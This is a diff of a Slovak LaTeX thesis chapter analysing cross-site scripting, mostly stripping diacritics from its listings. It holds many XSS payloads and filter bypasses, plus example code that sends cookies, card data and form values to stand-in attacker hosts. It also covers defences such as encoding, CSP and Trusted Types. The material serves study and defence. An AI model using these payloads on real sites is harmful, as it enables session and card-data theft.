@@ -1,4 +1,3 @@
-
 \chapter{Analýza problému}
 
 \section{Úvod do problematiky XSS}
@@ -19,7 +18,7 @@ V raných 2000s rokoch, keď vznikali prvé webové aplikácie s dynamickým obs
 
 Prvé XSS útoky boli relatívne primitívne, najčastejšie využívajúce \texttt{<script>} značky v URL parametroch alebo formulároch \parencite{vogt2007cross}. Príklad typického útočného kódu z tohto obdobia:
 
-\begin{lstlisting}[language=HTML, caption={URL útok cez search parameter}, label={lst:url-tok-cez-search-parameter-1}]
+\begin{lstlisting}[language=HTML, caption={URL utok cez search parameter}, label={lst:url-tok-cez-search-parameter-1}]
 http://vulnerable-site.com/search?q=<script>alert(document.cookie)</script>
 \end{lstlisting}
 
@@ -28,10 +27,18 @@ http://vulnerable-site.com/search?q=<script>alert(document.cookie)</script>
 S nárastom povedomia o XSS sa začali implementovať základné obranné mechanizmy, čo viedlo k vývoju techník na ich obchádzanie \parencite{pelizzi2012analyzing}. Vznikli databázy XSS útočných kódov ako \textit{XSS Cheat Sheet} od RSnake, ktoré obsahovali stovky variácií. Príklady zahŕňali:
 
 \begin{itemize}
-  \item Používanie alternatívnych značiek: \texttt{<img src=x onerror=alert(1)>}
-  \item Zahmliavanie kódovaním: \\
-        \texttt{<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>}
-  \item Obsluhy udalostí: \texttt{<body onload=alert(1)>}
+  \item Používanie alternatívnych značiek:
+        \begin{lstlisting}[language=HTML, caption={URL utok cez search parameter}, label={lst:url-tok-cez-search-parameter-1}]
+      <img src=x onerror=alert(1)>
+    \end{lstlisting}
+  \item Zahmliavanie kódovaním:
+        \begin{lstlisting}[language=HTML, caption={URL utok cez search parameter}, label={lst:url-tok-cez-search-parameter-1}]
+      <script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+    \end{lstlisting}
+  \item Obsluhy udalostí:
+        \begin{lstlisting}[language=HTML, caption={URL utok cez search parameter}, label={lst:url-tok-cez-search-parameter-1}]
+      <body onload=alert(1)>
+    \end{lstlisting}
 \end{itemize}
 
 \textbf{Fáza 3 (2013--2020): DOM-based a mutation XSS}
@@ -80,11 +87,11 @@ Mutation XSS je relatívne nový typ útoku objavený výskumníkmi Heiderichom 
 
 \textbf{Príklad mXSS útoku:}
 
-\begin{lstlisting}[language=HTML, caption={Príklad mutation XSS útoku}, label={lst:pr-klad-mutation-xss-toku-2}]
-<!-- Server vidí a dezinfikuje: -->
+\begin{lstlisting}[language=HTML, caption={Priklad mutation XSS utoku}, label={lst:pr-klad-mutation-xss-toku-2}]
+<!-- Server vidi a dezinfikuje: -->
 <noscript><p title="</noscript><img src=x onerror=alert(1)>">
 
-<!-- Prehliadač po analyzovaní vytvorí: -->
+<!-- Prehliadac po analyzovani vytvori: -->
 <noscript><p title="</noscript>
 <img src=x onerror=alert(1)>
 ">
@@ -107,8 +114,8 @@ Self-XSS je technika, kde útočník presvedčí obeť, aby do svojho vlastného
 
 \textbf{Príklad škodlivého kódu:}
 
-\begin{lstlisting}[language=JavaScript, caption={Škodlivý JavaScript kód}, label={lst:kodliv-javascript-k-d-3}]
-// "Bezplatní sledovatelia na Instagrame"
+\begin{lstlisting}[language=JavaScript, caption={Skodlivy JavaScript kod}, label={lst:kodliv-javascript-k-d-3}]
+// "Bezplatni sledovatelia na Instagrame"
 fetch('https://attacker.com/steal', {
   method: 'POST',
   body: JSON.stringify({
@@ -123,9 +130,9 @@ Významné platformy ako Facebook implementovali ochranu vložením varovných s
 
 \begin{lstlisting}[caption={Varovanie v Developer Console}, label={lst:varovanie-v-developer-console-4}]
 %c Stop!
-%c Toto je funkcia prehliadača určená pre vývojárov.
-%c Ak vám niekto povedal, aby ste sem niečo skopírovali a vložili,
-   je to podvod a umožní to útočníkovi prístup k vášmu účtu.
+%c Toto je funkcia prehliadaca urcena pre vyvojarov.
+%c Ak vam niekto povedal, aby ste sem nieco skopirovali a vlozili,
+   je to podvod a umozni to utocnikovi pristup k vasmu uctu.
 \end{lstlisting}
 
 \section{Technická anatómia XSS útoku}
@@ -137,25 +144,25 @@ Pre efektívnu obranu proti XSS je potrebné pochopiť jeho technickú anatómiu
 \textbf{Bod vloženia} je miesto v aplikácii, kde útočník môže vložiť svoje dáta \parencite{hydara2015current}. Najčastejšie typy:
 
 \textbf{1. URL parametre:}
-\begin{lstlisting}[language=HTML, caption={Príklad URL s útočným kódom}, label={lst:pr-klad-url-s-to-n-m-k-dom-5}]
-https://example.com/profile?name=<útočný_kód>
+\begin{lstlisting}[language=HTML, caption={Priklad URL s utocnym kodom}, label={lst:pr-klad-url-s-to-n-m-k-dom-5}]
+https://example.com/profile?name=<utocny_kod>
 \end{lstlisting}
 
 \textbf{2. Formulárové polia:}
-\begin{lstlisting}[language=HTML, caption={Útok cez formulárové pole}, label={lst:tok-cez-formul-rov-pole-6}]
+\begin{lstlisting}[language=HTML, caption={Utok cez formularove pole}, label={lst:tok-cez-formul-rov-pole-6}]
 <form method="POST">
   <input name="comment" value="<script>alert(1)</script>">
 </form>
 \end{lstlisting}
 
 \textbf{3. HTTP hlavičky:}
-\begin{lstlisting}[caption={XSS cez User-Agent hlavičku}, label={lst:xss-cez-user-agent-hlavi-ku-7}]
+\begin{lstlisting}[caption={XSS cez User-Agent hlavicku}, label={lst:xss-cez-user-agent-hlavi-ku-7}]
 User-Agent: <script>alert(document.cookie)</script>
 Referer: javascript:alert(1)
 \end{lstlisting}
 
 \textbf{4. Cookie hodnoty:}
-\begin{lstlisting}[language=JavaScript, caption={XSS cez modifikáciu cookies}, label={lst:xss-cez-modifik-ciu-cookies-8}]
+\begin{lstlisting}[language=JavaScript, caption={XSS cez modifikaciu cookies}, label={lst:xss-cez-modifik-ciu-cookies-8}]
 document.cookie = "lang=<img src=x onerror=alert(1)>";
 \end{lstlisting}
 
@@ -165,52 +172,52 @@ Rovnaký útočný kód môže fungovať alebo zlyhať v závislosti od \textit{
 
 \textbf{1. HTML kontext:}
 \begin{lstlisting}[language=HTML, caption={Kontext tela HTML}, label={lst:kontext-tela-html-9}]
-<!-- Vloženie do tela HTML -->
-<div>Meno používateľa: VSTUP_MIESTO</div>
+<!-- Vlozenie do tela HTML -->
+<div>Meno pouzivatela: VSTUP_MIESTO</div>
 
-<!-- Útok: -->
-<div>Meno používateľa: <img src=x onerror=alert(1)></div>
+<!-- Utok: -->
+<div>Meno pouzivatela: <img src=x onerror=alert(1)></div>
 \end{lstlisting}
 
 \textbf{2. Atribút kontext:}
-\begin{lstlisting}[language=HTML, caption={Kontext HTML atribútu}, label={lst:kontext-html-atrib-tu-10}]
-<!-- Vloženie do atribútu -->
+\begin{lstlisting}[language=HTML, caption={Kontext HTML atributu}, label={lst:kontext-html-atrib-tu-10}]
+<!-- Vlozenie do atributu -->
 <input value="VSTUP_MIESTO">
 
-<!-- Útok: -->
+<!-- Utok: -->
 <input value="" onfocus="alert(1)" autofocus="">
 \end{lstlisting}
 
 \textbf{3. JavaScript kontext:}
-\begin{lstlisting}[language=HTML, caption={Kontext JavaScript kódu}, label={lst:kontext-javascript-k-du-11}]
-<!-- Vloženie do JS reťazca -->
+\begin{lstlisting}[language=HTML, caption={Kontext JavaScript kodu}, label={lst:kontext-javascript-k-du-11}]
+<!-- Vlozenie do JS retazca -->
 <script>
   var userName = 'VSTUP_MIESTO';
 </script>
 
-<!-- Útok: -->
+<!-- Utok: -->
 <script>
   var userName = ''; alert(1); //';
 </script>
 \end{lstlisting}
 
 \textbf{4. URL kontext:}
-\begin{lstlisting}[language=HTML, caption={Kontext href atribútu}, label={lst:kontext-href-atrib-tu-12}]
-<!-- Vloženie do href -->
+\begin{lstlisting}[language=HTML, caption={Kontext href atributu}, label={lst:kontext-href-atrib-tu-12}]
+<!-- Vlozenie do href -->
 <a href="VSTUP_MIESTO">Kliknite tu</a>
 
-<!-- Útok: -->
+<!-- Utok: -->
 <a href="javascript:alert(1)">Kliknite tu</a>
 \end{lstlisting}
 
 \textbf{5. CSS kontext:}
 \begin{lstlisting}[language=HTML, caption={Kontext CSS}, label={lst:kontext-css-13}]
-<!-- Vloženie do CSS -->
+<!-- Vlozenie do CSS -->
 <style>
   body { background: VSTUP_MIESTO; }
 </style>
 
-<!-- Útok: -->
+<!-- Utok: -->
 <style>
   body { background: url('javascript:alert(1)'); }
 </style>
@@ -221,7 +228,7 @@ Rovnaký útočný kód môže fungovať alebo zlyhať v závislosti od \textit{
 \textbf{1. Polyglot XSS:}
 Polyglot je útočný kód, ktorý funguje vo viacerých kontextoch súčasne \parencite{lekies2015code}:
 
-\begin{lstlisting}[language=HTML, caption={Polyglot XSS kód}, label={lst:polyglot-xss-k-d-14}]
+\begin{lstlisting}[language=HTML, caption={Polyglot XSS kod}, label={lst:polyglot-xss-k-d-14}]
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 \end{lstlisting}
 
@@ -237,23 +244,23 @@ Tento polyglot funguje v:
 
 Aplikácie často implementujú jednoduché filtre, ktoré môžu byť obídené \parencite{pelizzi2012analyzing}:
 
-\begin{lstlisting}[language=HTML, caption={Technika obchádzania filtrov}, label={lst:technika-obch-dzania-filtrov-15}]
+\begin{lstlisting}[language=HTML, caption={Technika obchadzania filtrov}, label={lst:technika-obch-dzania-filtrov-15}]
 <!-- Filter blokuje "<script>" -->
-<!-- Obídenie #1: Veľké písmená -->
+<!-- Obidenie #1: Velke pismena -->
 <ScRiPt>alert(1)</sCrIpT>
 
-<!-- Obídenie #2: HTML entity -->
+<!-- Obidenie #2: HTML entity -->
 <script>alert(1)</script>
 
-<!-- Obídenie #3: Alternatívne značky -->
+<!-- Obidenie #3: Alternativne znacky -->
 <img src=x onerror=alert(1)>
 <svg onload=alert(1)>
 <body onload=alert(1)>
 
-<!-- Obídenie #4: JavaScript pseudo-protokol -->
+<!-- Obidenie #4: JavaScript pseudo-protokol -->
 <a href="javascript:alert(1)">klik</a>
 
-<!-- Obídenie #5: Data URI -->
+<!-- Obidenie #5: Data URI -->
 <object data="data:text/html,<script>alert(1)</script>">
 \end{lstlisting}
 
@@ -261,23 +268,23 @@ Aplikácie často implementujú jednoduché filtre, ktoré môžu byť obídené
 
 Útočníci používajú rôzne kódovacie schémy na skrytie škodlivého kódu \parencite{lekies2015code}:
 
-\begin{lstlisting}[language=HTML, caption={Kódovanie útočného kódu}, label={lst:k-dovanie-to-n-ho-k-du-16}]
-<!-- URL kódovanie -->
+\begin{lstlisting}[language=HTML, caption={Kodovanie utocneho kodu}, label={lst:k-dovanie-to-n-ho-k-du-16}]
+<!-- URL kodovanie -->
 %3Cscript%3Ealert(1)%3C/script%3E
 
-<!-- HTML entity kódovanie -->
+<!-- HTML entity kodovanie -->
 &lt;script&gt;alert(1)&lt;/script&gt;
 
-<!-- Unicode kódovanie -->
+<!-- Unicode kodovanie -->
 \u003cscript\u003ealert(1)\u003c/script\u003e
 
 <!-- Base64 -->
 <img src=x onerror="eval(atob('YWxlcnQoMSk='))">
 
-<!-- Hex kódovanie -->
+<!-- Hex kodovanie -->
 <img src=x onerror="eval('\x61\x6c\x65\x72\x74\x28\x31\x29')">
 
-<!-- Octal kódovanie -->
+<!-- Octal kodovanie -->
 <img src=x onerror="eval('\141\154\145\162\164\50\61\51')">
 \end{lstlisting}
 
@@ -285,7 +292,7 @@ Aplikácie často implementujú jednoduché filtre, ktoré môžu byť obídené
 
 Existuje viac ako 100 HTML atribútov, ktoré môžu spustiť JavaScript \parencite{whatwg2023html}:
 
-\begin{lstlisting}[language=HTML, caption={Rôzne event handlery}, label={lst:r-zne-event-handlery-17}]
+\begin{lstlisting}[language=HTML, caption={Rozne event handlery}, label={lst:r-zne-event-handlery-17}]
 <body onload=alert(1)>
 <img src=x onerror=alert(1)>
 <input onfocus=alert(1) autofocus>
@@ -307,13 +314,13 @@ Existuje viac ako 100 HTML atribútov, ktoré môžu spustiť JavaScript \parenc
 V roku 2009 sa šíril červ na Twitteri využívajúci Stored XSS zraniteľnosť. Útok fungoval takto:
 
 \begin{lstlisting}[language=JavaScript, caption={Twitter XSS worm}, label={lst:twitter-xss-worm-18}]
-// Zraniteľnosť: Twitter nesprávne znefunkčňoval onmouseover
+// Zranitelnost: Twitter nespravne znefunkcnoval onmouseover
 <div onmouseover="
-  // Skopíruj tento tweet do profilu obete
+  // Skopiruj tento tweet do profilu obete
   $.post('/status/update', {
     status: document.getElementById('payload').innerHTML
   });
-">Najedzte myšou sem!</div>
+">Prejdite mysou sem!</div>
 \end{lstlisting}
 
 Červ sa šíril exponenciálne -- každý, kto prešiel myšou cez infikovaný tweet, ho automaticky retweetol a infikoval svojich sledovateľov.
@@ -328,8 +335,8 @@ British Airways utrpela únik 380 000 záznamov platobných kariet cez XSS útok
   \item Exfiltrovali údaje na server útočníka
 \end{enumerate}
 
-\begin{lstlisting}[language=JavaScript, caption={Zjednodušená verzia útoku}, label={lst:zjednodu-en-verzia-toku-19}]
-// Vložený škodlivý skript
+\begin{lstlisting}[language=JavaScript, caption={Zjednodusena verzia utoku}, label={lst:zjednodu-en-verzia-toku-19}]
+// Vlozeny skodlivy skript
 (function() {
   const form = document.querySelector('form[name="payment"]');
   
@@ -340,7 +347,7 @@ British Airways utrpela únik 380 000 záznamov platobných kariet cez XSS útok
       expiry: form.querySelector('[name="expiry"]').value
     };
     
-    // Odoslať na server útočníka
+    // Odoslat na server utocnika
     fetch('https://attacker-domain.com/collect', {
       method: 'POST',
       body: JSON.stringify(data)
@@ -355,16 +362,16 @@ Tento incident stál British Airways £20 milónov v pokute od ICO (Information 
 
 Jeden z najznámejších XSS červov v histórii. Samy Kamkar vytvoril samoreplikujúci sa XSS skript, ktorý:
 
-\begin{lstlisting}[language=JavaScript, caption={Zjednodušená štruktúra Samy wormu}, label={lst:zjednodu-en-trukt-ra-samy-wormu-20}]
-// Červ, ktorý sa kopíroval do profilov
+\begin{lstlisting}[language=JavaScript, caption={Zjednodusena struktura Samy wormu}, label={lst:zjednodu-en-trukt-ra-samy-wormu-20}]
+// Cerv ktory sa skopiroval do profilov
 var payload = '<div id="mycode">' +
-  'this script here' + // Samotný kód červa
+  'this script here' + // kod cerva
 '</div>';
 
-// Pridal útočníka ako priateľa
+// Pridal utocnika ako priatela
 xmlhttp.send('friend_id=11851658&action=add');
 
-// Vložil červa do profilu obete
+// Vlozil cerva do profilu obete
 xmlhttp.send('profile_text=' + encodeURIComponent(payload));
 \end{lstlisting}
 
@@ -379,7 +386,7 @@ Validácia vstupov je prvou líniou obrany, ale má významné limitácie \paren
 \textbf{Prístup: Whitelist vs. Blacklist}
 
 \textbf{Blacklist (zlý prístup):}
-\begin{lstlisting}[language=JavaScript, caption={Príklad blacklist validácie}, label={lst:pr-klad-blacklist-valid-cie-21}]
+\begin{lstlisting}[language=JavaScript, caption={Priklad blacklist validacie}, label={lst:pr-klad-blacklist-valid-cie-21}]
 function sanitize(input) {
   return input
     .replace(/<script>/gi, '')
@@ -387,21 +394,21 @@ function sanitize(input) {
     .replace(/onerror/gi, '');
 }
 
-// Ľahko obídené:
+// Lahko obiditelne
 sanitize('<scr<script>ipt>alert(1)</script>') 
-// Výsledok: <script>alert(1)</script>
+// Vysledok: <script>alert(1)</script>
 \end{lstlisting}
 
 \textbf{Whitelist (lepší prístup):}
-\begin{lstlisting}[language=JavaScript, caption={Príklad whitelist validácie}, label={lst:pr-klad-whitelist-valid-cie-22}]
+\begin{lstlisting}[language=JavaScript, caption={Priklad whitelist validacie}, label={lst:pr-klad-whitelist-valid-cie-22}]
 function sanitizeUsername(input) {
-  // Povoliť iba alfanumerické znaky a podčiarkovníky
+  // Povolit iba alfanumericke znaky a podciarkovniky  
   return input.replace(/[^a-zA-Z0-9_]/g, '');
 }
 
-// Nemôže byť obídené XSS útokmi
+// Nemoze byt obidene XSS utokmi
 sanitizeUsername('<script>alert(1)</script>')
-// Výsledok: 'scriptalert1script'
+// Vysledok: 'scriptalert1script'
 \end{lstlisting}
 
 \subsection{Kódovanie výstupov (Output Encoding)}
@@ -409,7 +416,7 @@ sanitizeUsername('<script>alert(1)</script>')
 Kódovanie výstupov je najefektívnejšia obrana, ale musí byť kontextovo špecifické \parencite{samuel2011context}.
 
 \textbf{1. HTML Entity Encoding:}
-\begin{lstlisting}[language=JavaScript, caption={HTML entity kódovanie}, label={lst:html-entity-k-dovanie-23}]
+\begin{lstlisting}[language=JavaScript, caption={HTML entity kodovanie}, label={lst:html-entity-k-dovanie-23}]
 function encodeHTML(str) {
   return str
     .replace(/&/g, '&amp;')
@@ -419,14 +426,14 @@ function encodeHTML(str) {
     .replace(/'/g, '&#x27;');
 }
 
-// Použitie:
+// Pouzitie:
 const userInput = '<script>alert(1)</script>';
 element.innerHTML = encodeHTML(userInput);
-// Výsledok: &lt;script&gt;alert(1)&lt;/script&gt;
+// Vysledok: &lt;script&gt;alert(1)&lt;/script&gt;
 \end{lstlisting}
 
 \textbf{2. JavaScript Encoding:}
-\begin{lstlisting}[language=JavaScript, caption={JavaScript kódovanie}, label={lst:javascript-k-dovanie-24}]
+\begin{lstlisting}[language=JavaScript, caption={JavaScript kodovanie}, label={lst:javascript-k-dovanie-24}]
 function encodeJS(str) {
   return str
     .replace(/\\/g, '\\\\')
@@ -437,22 +444,22 @@ function encodeJS(str) {
     .replace(/\t/g, '\\t');
 }
 
-// Použitie:
+// Pouzitie:
 const userInput = "'; alert(1); //";
 const script = `var name = '${encodeJS(userInput)}';`;
-// Výsledok: var name = '\'; alert(1); //';
+// Vysledok: var name = '\'; alert(1); //';
 \end{lstlisting}
 
 \textbf{3. URL Encoding:}
-\begin{lstlisting}[language=JavaScript, caption={URL kódovanie}, label={lst:url-k-dovanie-25}]
+\begin{lstlisting}[language=JavaScript, caption={URL kodovanie}, label={lst:url-k-dovanie-25}]
 function encodeURL(str) {
   return encodeURIComponent(str);
 }
 
-// Použitie:
+// Pouzitie:
 const userInput = 'javascript:alert(1)';
 const url = `/search?q=${encodeURL(userInput)}`;
-// Výsledok: /search?q=javascript%3Aalert(1)
+// Vysledok: /search?q=javascript%3Aalert(1)
 \end{lstlisting}
 
 \subsection{Content Security Policy (CSP)}
@@ -460,7 +467,7 @@ const url = `/search?q=${encodeURL(userInput)}`;
 CSP je mocný obranný mechanizmus, ktorý obmedzuje, odkiaľ môžu byť načítané zdroje \parencite{stamm2010reining}.
 
 \textbf{Základná CSP konfigurácia:}
-\begin{lstlisting}[caption={Základný CSP header}, label={lst:z-kladn-csp-header-26}]
+\begin{lstlisting}[caption={Zakladny CSP header}, label={lst:z-kladn-csp-header-26}]
 Content-Security-Policy: 
   default-src 'self';
   script-src 'self' https://trusted-cdn.com;
@@ -479,15 +486,15 @@ Content-Security-Policy:
 \end{lstlisting}
 
 \begin{lstlisting}[language=HTML, caption={HTML s nonce}, label={lst:html-s-nonce-28}]
-<!-- Server generuje náhodný nonce pre každú požiadavku -->
+<!-- Server generuje nahodny nonce pre kazdu poziadavku -->
 <script nonce="2726c7f26c">
-  // Tento skript je povolený
+  // Tento skript je povoleny
   console.log('Ahoj');
 </script>
 
 <script>
-  // Tento skript je zablokovaný (chýba nonce)
-  console.log('Blokované');
+  // Tento skript je zablokovany lebo chyba nonce
+  console.log('Blokovane');
 </script>
 \end{lstlisting}
 
@@ -511,10 +518,10 @@ Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
 \end{lstlisting}
 
 \textbf{Účinok:}
-\begin{lstlisting}[language=JavaScript, caption={Pokus o prístup k HttpOnly cookie}, label={lst:pokus-o-pr-stup-k-httponly-cookie-30}]
-// Útok XSS:
+\begin{lstlisting}[language=JavaScript, caption={Pokus o pristup k HttpOnly cookie}, label={lst:pokus-o-pr-stup-k-httponly-cookie-30}]
+// Utok XSS:
 console.log(document.cookie); 
-// Výsledok: "" (prázdny string, sessionId nie je viditeľný)
+// Vysledok: "" (prazdny string, sessionId nie je viditelny)
 \end{lstlisting}
 
 \textbf{SameSite atribút} zabraňuje CSRF útokom \parencite{west2016samesite}:
@@ -530,15 +537,15 @@ console.log(document.cookie);
 
 React automaticky znefunkčňuje obsah v JSX \parencite{weinberger2011systematic}:
 
-\begin{lstlisting}[language=JavaScript, caption={React automatické znefunkčnenie}, label={lst:react-automatick-znefunk-nenie-31}]
-// BEZPEČNÉ: React automaticky znefunkčňuje
+\begin{lstlisting}[language=JavaScript, caption={React automaticke znefunkcnenie}, label={lst:react-automatick-znefunk-nenie-31}]
+// BEZPECNE: React automaticky znefunkcnuje
 const userInput = '<img src=x onerror=alert(1)>';
 return <div>{userInput}</div>;
-// Vykreslí: &lt;img src=x onerror=alert(1)&gt;
+// Vykresli: &lt;img src=x onerror=alert(1)&gt;
 
-// NEBEZPEČNÉ: dangerouslySetInnerHTML obchádza ochranu
+// NEBEZPECNE: dangerouslySetInnerHTML obchadza ochranu
 return <div dangerouslySetInnerHTML={{__html: userInput}} />;
-// Vykreslí: <img src=x onerror=alert(1)>
+// Vykresli: <img src=x onerror=alert(1)>
 \end{lstlisting}
 
 \textbf{Angular:}
@@ -550,10 +557,10 @@ import { DomSanitizer } from '@angular/platform-browser';
 
 constructor(private sanitizer: DomSanitizer) {}
 
-// BEZPEČNÉ: Angular automaticky znefunkčňuje
+// BEZPECNE: Angular automaticky znefunkcnuje
 template = '<img src=x onerror=alert(1)>';
 
-// Ak chcete dôverovať HTML:
+// Ak chcete doverovat HTML:
 trustedHtml = this.sanitizer.sanitize(SecurityContext.HTML, this.template);
 \end{lstlisting}
 
@@ -561,11 +568,11 @@ trustedHtml = this.sanitizer.sanitize(SecurityContext.HTML, this.template);
 
 Vue tiež automaticky znefunkčňuje:
 
-\begin{lstlisting}[language=HTML, caption={Vue znefunkčnenie}, label={lst:vue-znefunk-nenie-33}]
-<!-- BEZPEČNÉ: Automaticky znefunkčnené -->
+\begin{lstlisting}[language=HTML, caption={Vue znefunkcnenie}, label={lst:vue-znefunk-nenie-33}]
+<!-- BEZPECNE: Automaticky znefunkcnene -->
 <div>{{ userInput }}</div>
 
-<!-- NEBEZPEČNÉ: v-html obchádza ochranu -->
+<!-- NEBEZPECNE: v-html obchadza ochranu -->
 <div v-html="userInput"></div>
 \end{lstlisting}
 
@@ -573,7 +580,7 @@ Vue tiež automaticky znefunkčňuje:
 
 Trusted Types je nový webový štandard, ktorý sa snaží riešiť XSS na úrovni platformy \parencite{w3c2023trustedtypes}:
 
-\begin{lstlisting}[language=JavaScript, caption={Použitie Trusted Types}, label={lst:pou-itie-trusted-types-34}]
+\begin{lstlisting}[language=JavaScript, caption={Pouzitie Trusted Types}, label={lst:pou-itie-trusted-types-34}]
 // Vytvorenie politiky
 const policy = trustedTypes.createPolicy('myPolicy', {
   createHTML: (string) => {
@@ -585,14 +592,14 @@ const policy = trustedTypes.createPolicy('myPolicy', {
     if (string.startsWith('https://trusted-cdn.com/')) {
       return string;
     }
-    throw new TypeError('Nepovolený script URL');
+    throw new TypeError('Nepovoleny script URL');
   }
 });
 
-// Použitie:
+// Pouzitie:
 const userInput = '<img src=x onerror=alert(1)>';
-element.innerHTML = policy.createHTML(userInput); // Bezpečné
-element.innerHTML = userInput; // Chyba v prehliadačoch s Trusted Types
+element.innerHTML = policy.createHTML(userInput); // Bezpecne
+element.innerHTML = userInput; // Chyba v prehliadacoch s Trusted Types
 \end{lstlisting}
 
 \textbf{Aktivácia Trusted Types:}
@@ -684,18 +691,18 @@ Napriek viac ako 20 rokom povedomia zostáva XSS jednou z top 3 zraniteľností 
 
 Moderná webová aplikácia je nepreberná zmes technológií \parencite{stackoverflow2023survey}:
 
-\begin{lstlisting}[language=JavaScript, caption={Typický tech stack}, label={lst:typick-tech-stack-52}]
+\begin{lstlisting}[language=JavaScript, caption={Typicky tech stack}, label={lst:typick-tech-stack-52}]
 // Frontend
 React/Vue/Angular + TypeScript
 Webpack/Vite bundler
-50+ npm závislostí
+50+ npm zavislosti
 
 // Backend  
 Node.js/Python/PHP/Java
 REST/GraphQL API
-10+ third-party integrácie
+10+ third-party integracie
 
-// Infraštruktúra
+// Infrastruktura
 Docker/Kubernetes
 CDN (Cloudflare/Akamai)
 Multiple microservices
@@ -712,12 +719,12 @@ Každá vrstva zavádza potenciálne bezpečnostné riziká.
   \item Priemerný čas na opravu zraniteľnosti: 38 dní (ale v legacy systémoch: 120+ dní)
 \end{itemize}
 
-\begin{lstlisting}[language=PHP, caption={Typický legacy PHP kód}, label={lst:typick-legacy-php-k-d-53}]
-<!-- Napísaný v 2008, stále v produkcii v 2024 -->
+\begin{lstlisting}[language=PHP, caption={Typicky legacy PHP kod}, label={lst:typick-legacy-php-k-d-53}]
+<!-- Napisany v 2008, stale v produkcii v 2024 -->
 <?php
-  // Žiadne ošetrenie vstupov!
+  // Ziadne osetrenie vstupov!
   $search = $_GET['q'];
-  echo "Výsledky pre: " . $search;
+  echo "Vysledky pre: " . $search;
 ?>
 \end{lstlisting}
 
@@ -731,11 +738,11 @@ Stack Overflow prieskum \parencite{stackoverflow2023survey}:
 \end{itemize}
 
 \textbf{Priemerný vývojár vie:}
-\begin{lstlisting}[language=JavaScript, caption={Komentár v JavaScript kóde}, label={lst:koment-r-v-javascript-k-de-54}]
-// "Použij innerHTML, je to rýchlejšie"
+\begin{lstlisting}[language=JavaScript, caption={Komentar v JavaScript kode}, label={lst:koment-r-v-javascript-k-de-54}]
+// "Pouzi innerHTML, je to rychlejsie"
 element.innerHTML = userData; // XSS!
 
-// Namiesto bezpečného:
+// Namiesto bezpecneho:
 element.textContent = userData;
 \end{lstlisting}
 
@@ -743,35 +750,35 @@ element.textContent = userData;
 
 Typický vývojový proces:
 
-\begin{lstlisting}[language=JavaScript, caption={Komentár v JavaScript kóde}, label={lst:koment-r-v-javascript-k-de-55}]
-// Sprint plánovanie:
-"Musíme to dodať do piatku!" 
-// → Bezpečnosť: odložená
+\begin{lstlisting}[language=JavaScript, caption={Komentar v JavaScript kode}, label={lst:koment-r-v-javascript-k-de-55}]
+// Sprint planovanie:
+"Musime to dodat do piatku!" 
+// → Bezpecnost: odlozena
 
 // Code review:
-"LGTM" (5-minútový review)
-// → XSS: nenájdené
+"LGTM" (5-minutovy review)
+// → XSS: nenajdene
 
 // Testing:
-"Všetky unit testy prechádzajú"
-// → Security tests: žiadne
+"Vsetky unit testy prechadzaju"
+// → Security tests: ziadne
 
 // Deploy:
 git push && deploy
-// → Security scan: preskočený (lebo je pomalý)
+// → Security scan: preskoceny (lebo je pomaly)
 \end{lstlisting}
 
 \subsection{Závislosti tretích strán}
 
 Moderné aplikácie závisia od stoviek npm balíkov \parencite{snyk2023vulnerabilities}:
 
-\begin{lstlisting}[language=JavaScript, caption={Komentár v JavaScript kóde}, label={lst:koment-r-v-javascript-k-de-56}]
-// Typický strom závislostí package.json
-závislosti: 287 balíkov
+\begin{lstlisting}[language=JavaScript, caption={Komentar v JavaScript kode}, label={lst:koment-r-v-javascript-k-de-56}]
+// Typicky strom zavislosti package.json
+zavislosti: 287 balikov
 ├─ priame: 23
-└─ tranzitívne: 264
+└─ tranzitivne: 264
 
-// Koľko z týchto 287 ste osobne skontrolovali?
+// Kolko z tychto 287 ste osobne skontrolovali?
 \end{lstlisting}
 
 Štúdia Snyk (2023): 77\,\% známych zraniteľností prichádza z tranzitívnych závislostí \parencite{snyk2023vulnerabilities}.
@@ -780,14 +787,14 @@ závislosti: 287 balíkov
 
 Vývojár musí neustále prepínať medzi kontextmi \parencite{samuel2011context}:
 
-\begin{lstlisting}[language=HTML, caption={HTML s injektovaným skriptom}, label={lst:html-s-injektovan-m-skriptom-57}]
-<!-- Šablóna kde každý zástupný symbol má iné pravidlá -->
+\begin{lstlisting}[language=HTML, caption={HTML s injektovanym skriptom}, label={lst:html-s-injektovan-m-skriptom-57}]
+<!-- Sablona kde kazdy zastupny symbol ma ine pravidla -->
 <div>
-  <!-- HTML kontext: znefunkčniť < > & " ' -->
+  <!-- HTML kontext: znefunkcnit < > & " ' -->
   {znefunkcniHTML(pouzivatelVstup)}
   
   <a href="/search?q={kodujURL(pouzivatelVstup)}">
-    <!-- URL kontext: url kódovanie -->
+    <!-- URL kontext: url kodovanie -->
   </a>
   
   <script>
@@ -809,15 +816,15 @@ Každý kontext vyžaduje iné ošetrenie. Pomýlenie kontextov je ľahké a ča
 Dôkladná dezinfekcia môže mať vplyv na výkon:
 
 \begin{lstlisting}[language=JavaScript, caption={Funkcia na dezinfekciu vstupu}, label={lst:funkcia-na-dezinfekciu-vstupu-58}]
-// Jednoduchá, ale pomalá dezinfekcia
+// Jednoducha, ale pomala dezinfekcia
 function dezinfikuj(html) {
   const div = document.createElement('div');
   div.innerHTML = html;
-  // Analyzovanie cez DOM je pomalé
+  // Analyzovanie cez DOM je pomale
   return div.textContent;
 }
 
-// 1000 položiek = 1000 DOM operácií = značné oneskorenie
+// 1000 poloziek = 1000 DOM operacii = znacne oneskorenie
 \end{lstlisting}
 
 Vývojár často volí rýchlosť nad bezpečnosťou, najmä keď je termín blízko.
@@ -827,8 +834,8 @@ Vývojár často volí rýchlosť nad bezpečnosťou, najmä keď je termín bl�
 Útočníci neustále nachádzajú nové vektory \parencite{lekies2015code}. Príklady z posledných rokov:
 
 \textbf{2020: Exfiltrácia cez CSS:}
-\begin{lstlisting}[language=HTML, caption={Príklad šablóny}, label={lst:pr-klad-abl-ny-59}]
-/* Únik dát cez CSS */
+\begin{lstlisting}[language=HTML, caption={Priklad sablony}, label={lst:pr-klad-abl-ny-59}]
+/* Unik dat cez CSS */
 input[value^="a"] {
   background: url('https://attacker.com/leak?c=a');
 }
@@ -838,14 +845,14 @@ input[value^="a"] {
